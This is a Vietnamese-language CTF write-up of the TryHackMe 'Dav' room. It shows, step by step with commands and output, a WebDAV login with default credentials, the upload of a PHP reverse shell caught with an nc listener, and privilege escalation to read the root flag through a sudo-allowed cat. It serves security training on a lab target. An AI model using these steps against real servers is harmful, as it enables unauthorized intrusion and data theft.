---
title: "Tryhackme - Dav"
date: "2022-03-16"
tags: [
    "web",
    "linux",
    "webdav",
    "ssh",
]
---


Xin chào, lại là tôi đây. Hôm nay tôi sẽ giải CTF [TryHackMe | Dav](https://tryhackme.com/room/bsidesgtdav)
## Reconnaissance

Vẫn như thông thường, việc đầu tiên cần làm quét các cổng đang mở trên máy chủ mục tiêu

```python
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

Web này chỉ là trang mặc định, phần source cũng không có gì đặc biệt. Tôi sẽ dùng *dirsearch* để tìm path

```python
[05:39:10] 401 -  459B  - /webdav/index.html                                
[05:39:10] 401 -  459B  - /webdav/                                          
[05:39:10] 401 -  459B  - /webdav/servlet/webdav/      
```

Khi truy cập vào path này, tôi cần phải có user và pass. Sau 1 lúc tìm hiểu về webdav thì tôi tìm được cách kiểm tra và truy cập webdav với user và pass mặc định. Nó ở [đây](https://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html). 

Thử login webdav với *cadaver* - tool có sẵn trên kali

```python
┌──(neo㉿kali)-[~]
└─$ cadaver http://10.10.115.69/webdav
Authentication required for webdav on server `10.10.115.69':
Username: wampp
Password: 
dav:/webdav/> ?
Available commands: 
 ls         cd         pwd        put        get        mget       mput       
 edit       less       mkcol      cat        delete     rmcol      copy       
 move       lock       unlock     discover   steal      showlocks  version    
 checkin    checkout   uncheckout history    label      propnames  chexec     
 propget    propdel    propset    search     set        open       close      
 echo       quit       unset      lcd        lls        lpwd       logout     
 help       describe   about      
Aliases: rm=delete, mkdir=mkcol, mv=move, cp=copy, more=less, quit=exit=bye
dav:/webdav/>
```

Tôi sẽ thử tạo 1 file txt và upload nó lên webdav, để kiểm tra xem nó có chạy không.

```python
┌──(neo㉿kali)-[~]
└─$ echo "TESTING" > test.txt
```

```python
dav:/webdav/> put test.txt
Uploading test.txt to `/webdav/test.txt':
Progress: [=============================>] 100.0% of 8 bytes succeeded.
dav:/webdav/> 
```

Truy cập trên web 

![testing](2.png)

Thành công. Tôi sẽ thử đẩy reverse shell lên đây

```python
dav:/webdav/> put reshell.php 
Uploading reshell.php to `/webdav/reshell.php':
Progress: [=============================>] 100.0% of 2586 bytes succeeded.
dav:/webdav/> 
```

Tạo listener với port 2402 - port đã cấu hình bên trong file shell.

`nc -nlvp 2402`

Bây giờ thì thử truy cập shell vừa tạo 

```python
┌──(neo㉿kali)-[~]
└─$ nc -lnvp 2402            
listening on [any] 2402 ...
connect to [10.6.0.191] from (UNKNOWN) [10.10.115.69] 50358
Linux ubuntu 4.4.0-159-generic #187-Ubuntu SMP Thu Aug 1 16:28:06 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 03:17:08 up  1:06,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (690): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/$ 
```

Tôi tìm được *user flag* trong thư mục user *merlin*

```python
www-data@ubuntu:/$ ls -la /home
ls -la /home
total 16
drwxr-xr-x  4 root   root   4096 Aug 25  2019 .
drwxr-xr-x 22 root   root   4096 Aug 25  2019 ..
drwxr-xr-x  4 merlin merlin 4096 Aug 25  2019 merlin
drwxr-xr-x  2 wampp  wampp  4096 Aug 25  2019 wampp
www-data@ubuntu:/$ cd /home/merlin
cd /home/merlin
www-data@ubuntu:/home/merlin$ ls
ls
user.txt
www-data@ubuntu:/home/merlin$
```

## Privilege escalation

`sudo -l`

```python
www-data@ubuntu:/home/merlin$ sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
www-data@ubuntu:/home/merlin$
```

[cat | GTFOBins](https://gtfobins.github.io/gtfobins/cat/):

```python
www-data@ubuntu:/home/merlin$ LFILE=/root/root.txt
LFILE=/root/root.txt
www-data@ubuntu:/home/merlin$ sudo cat "$LFILE"
sudo cat "$LFILE"
1011***********************7afa5
www-data@ubuntu:/home/merlin$ 
```

